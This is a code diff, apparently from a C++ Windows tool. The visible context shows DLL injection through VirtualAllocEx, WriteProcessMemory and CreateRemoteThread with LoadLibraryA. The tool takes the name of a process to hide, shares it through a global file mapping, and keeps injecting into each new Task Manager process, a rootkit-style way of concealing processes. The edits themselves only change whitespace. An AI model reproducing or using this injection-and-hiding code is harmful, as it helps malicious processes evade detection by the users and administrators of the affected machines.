@@ -16,7 +16,7 @@ bool inject_dll(DWORD pid, string dll_path) {
 	}
 	else { cout << " [+] Got a Handle to the Remote Process" << endl; }
 
-	LPVOID address = VirtualAllocEx(handle, NULL, dll_path.length() , MEM_COMMIT | MEM_RESERVE,
+	LPVOID address = VirtualAllocEx(handle, NULL, dll_path.length(), MEM_COMMIT | MEM_RESERVE,
 		PAGE_EXECUTE_READWRITE);
 	if (address == NULL) {
 		cout << " [-] VirtualAllocEx Failed" << endl;
@@ -27,7 +27,7 @@ bool inject_dll(DWORD pid, string dll_path) {
 	if (!res) {
 		cout << " [-] WriteProcessMemory Failed" << endl;
 	}
-	if (CreateRemoteThread(handle, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryA, (LPVOID)address, NULL, NULL) ==  INVALID_HANDLE_VALUE) {
+	if (CreateRemoteThread(handle, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryA, (LPVOID)address, NULL, NULL) == INVALID_HANDLE_VALUE) {
 		cout << " [-] CreateRemoteThread Failed" << endl;
 	}
 	else { cout << " [+] DLL Loaded Into Remote Process" << endl; }
@@ -87,7 +87,7 @@ bool map_process_name(string process) {
 		0,
 		255,
 		"Global\\GetProcessName"
-		);
+	);
 
 	if (map == NULL) {
 		cout << "CreateFileMapping Failed" << endl;
@@ -113,7 +113,7 @@ int main()
 {
 	string process, inp;
 	cout << " Enter Process Name To Hide" << endl << "--> ";
-    cin >> process;
+	cin >> process;
 	cout << endl;
 	map_process_name(process);
 
@@ -125,7 +125,7 @@ int main()
 		NULL,
 		NULL
 	);
-	
+
 	cout << "Enter \"quit\" to Quit or Keep this running to inject into future task manager processes" << endl << endl;
 	while (true) {
 		cin >> inp;
